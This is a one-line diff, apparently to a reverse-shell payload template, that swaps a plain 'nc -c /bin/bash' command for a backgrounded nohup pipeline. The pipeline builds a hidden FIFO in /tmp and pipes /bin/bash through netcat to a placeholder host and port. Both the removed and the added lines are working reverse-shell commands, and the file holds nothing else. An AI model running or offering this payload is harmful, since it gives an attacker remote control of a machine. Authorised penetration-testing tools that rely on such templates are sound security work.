@@ -1,1 +1,1 @@
-nc -c /bin/bash __HOST__ __PORT__
+/usr/bin/nohup /bin/bash -c "mkfifo /tmp/.platypus;nc __HOST__ __PORT__ 0</tmp/.platypus | /bin/bash | tee /tmp/.platypus" &
